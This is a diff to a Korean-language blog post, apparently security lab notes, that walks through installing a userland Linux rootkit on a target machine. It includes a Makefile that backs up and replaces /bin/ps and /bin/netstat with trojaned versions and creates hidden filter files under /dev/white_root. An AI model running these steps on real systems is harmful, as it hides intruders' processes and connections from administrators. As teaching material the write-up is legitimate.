@@ -301,3 +301,96 @@ int main(int argc, char* argv[])
 
 <br>
 
+공격대상-> backdoor check
+
+```
+프로세스 확인
+# ps -ef
+
+포트확인
+# netstat -antup
+```
+
+![2022-10-18-24확인](../images/2022-10-18-LinuxBackdoor/2022-10-18-24확인.jpg)
+
+<br>
+
+공격대상 -> 실행된 프로세스를 노출시키지 않도록 은닉
+
+![2022-10-18-25rootkit](../images/2022-10-18-LinuxBackdoor/2022-10-18-25rootkit.jpg)
+
+<br>
+
+공격대상 -> ps, netstat, ls 파일 백업
+
+![2022-10-18-27백업](../images/2022-10-18-LinuxBackdoor/2022-10-18-27백업.jpg)
+
+<br>
+
+공격대상 -> rootkit 디렉터리 출력시에 보이지 않도록 할 목록 파일
+
+![2022-10-18-28만들기](../images/2022-10-18-LinuxBackdoor/2022-10-18-28만들기.jpg)
+
+![2022-10-18-29디렉터리](../images/2022-10-18-LinuxBackdoor/2022-10-18-29디렉터리.jpg)
+
+<br>
+
+ make : gcc 관련 내용을 정의 - makefile
+
+```
+vim ./Makefile
+
+```bash
+rootkit 디렉터리 출력시에 보이지 않도록 할 목록 파일
+[root@localhost white_rootkit]# touch /root/white_rootkit/.white_psfile
+[root@localhost white_rootkit]# touch /root/white_rootkit/.white_netfile
+
+ make : gcc 관련 내용을 정의 - makefile
+
+[root@localhost white_rootkit]# pwd
+/root/white_rootkit
+
+[root@localhost white_rootkit]# ls
+Makefile  white_backc.c  white_backs.c  white_ls.c  white_net.c  white_ps.c
+[root@localhost white_rootkit]# vim Makefile 
+default:
+	~~gcc -o white_backc white_backc.c
+	gcc -o white_backs white_backs.c~~
+	gcc -o white_net white_net.c
+	gcc -o white_ps white_ps.c
+
+install:
+	mv /bin/ps /bin/.ps
+	mv /bin/netstat /bin/.netstat
+	mkdir /dev/white_root
+	cp .white_netfile /dev/white_root/.white_netfile
+	cp .white_psfile /dev/white_root/.white_psfile
+	~~cp white_backc /.white_backc~~
+	cp white_ps /bin/ps
+	cp white_net /bin/netstat
+
+~~white_backc : white_backc.c
+	gcc -o white_backc white_backc.c
+white_backs : white_backs.c
+	gcc -o white_backs white_backs.c
+white_net : white_net.c
+	gcc -o white_net white_net.c
+white_ps : white_ps.c
+	gcc -o white_ps white_ps.c~~
+
+uninstall:
+	mv /bin/.ps /bin/ps
+	mv /bin/.netstat /bin/netstat
+ 	~~rm -rf /dev/white_root
+	rm -rf /.white_backc~~
+
+clean:
+	rm -rf white_ps white_net
+```
+
+컴파일
+
+![2022-10-18-30make](../images/2022-10-18-LinuxBackdoor/2022-10-18-30make.jpg)
+
+<br>
+
